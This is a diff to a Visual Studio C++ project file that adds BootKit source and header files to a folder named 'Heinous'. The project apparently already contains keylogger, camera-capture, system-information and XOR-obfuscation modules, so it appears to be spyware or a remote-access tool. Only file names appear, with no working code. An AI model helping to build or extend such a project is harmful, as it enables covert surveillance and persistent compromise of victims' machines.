@@ -143,6 +143,7 @@
   <ItemGroup>
     <ClCompile Include="Librarys\Heinous\Key-Log\Key-Log.cpp" />
     <ClCompile Include="Librarys\Heinous\Camera\Camera.cpp" />
+    <ClCompile Include="Librarys\Heinous\BootKit\BootKit.cpp" />
     <ClCompile Include="Source Files\entry.cpp" />
     <ClCompile Include="Librarys\Fetch\Hardware\Hardware.cpp" />
     <ClCompile Include="Librarys\Fetch\File\File.cpp" />
@@ -161,6 +162,7 @@
     <ClInclude Include="Librarys\Fetch\Network\Network-Info.h" />
     <ClInclude Include="Librarys\Fetch\User\User.h" />
     <ClInclude Include="Librarys\Xor\Xor.h" />
+    <ClInclude Include="Librarys\Heinous\BootKit\BootKit.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
